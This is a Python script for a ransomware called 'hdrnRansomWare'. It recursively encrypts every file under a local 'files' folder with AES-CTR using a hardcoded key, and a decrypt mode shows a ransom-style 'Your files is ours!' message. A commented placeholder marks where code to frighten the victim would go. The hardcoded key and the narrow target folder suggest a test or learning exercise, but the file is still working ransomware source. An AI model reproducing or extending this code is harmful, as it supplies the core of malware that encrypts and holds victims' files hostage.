#!/usr/bin/python3.7
# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

HARDOCODED_KEY = 'just a wild test ransomware xD!!'

def getParser():
    parser = argparse.ArgumentParser(description="hdrnRansomWare")
    parser.add_argument(
        '-d', '--decrypt', help='decrypt files [default: no]', action='store_true')
    return parser

def main():
    parser = getParser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
                hdrnRansomWare
                ----------------------------------------------

                Your files is ours!
                To decrypt use the password: '{}'
                Only input the correct pass    
                '''.format(HARDOCODED_KEY))

        key = input('Type your Key => ')
    else:
        if HARDOCODED_KEY:
            key = HARDOCODED_KEY
    
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptoFN = crypt.encrypt
    else:
        cryptoFN = crypt.decrypt

    initPath = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [initPath]

    for currentDir in startDirs:
        for filename in Discovery.discover(currentDir):
            Crypter.changeFiles(filename, cryptoFN)


    for _ in range(100):
        pass

    if not decrypt:
        # Código malicioso para assustar a vitima
        pass    

if __name__ == '__main__':
    main()